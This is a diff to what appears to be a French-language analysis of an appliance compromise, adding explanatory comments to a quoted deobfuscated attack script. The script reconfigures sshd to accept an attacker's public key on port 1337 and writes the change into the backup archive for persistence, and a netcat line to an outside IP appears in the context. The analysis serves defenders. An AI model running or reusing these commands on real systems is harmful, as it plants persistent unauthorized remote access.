@@ -159,11 +159,14 @@ nc 146.0.228.66:1337
 
 Après désobfuscation, les commandes exécutent en réalité script suivant :
 ```bash
+# AJOUTE LA CLE SSH PUBLIQUE DE L'ATTAQUANT POUR QU'IL PUISSE SE CONNECTER N'IMPORTE QUAND
 sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
 sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
 echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
 echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
 pkill sshd-ive > /dev/null 2>&1
+
+# ENREGISTRE CETTE MODIFICATION DANS L'ARCHIVE DE BACKUP POUR QUE LA BACKDOOR SOIT PERSISTANTE
 gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
 tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
 gzip /data/pkg/data-backup.tar > /dev/null 2>&1
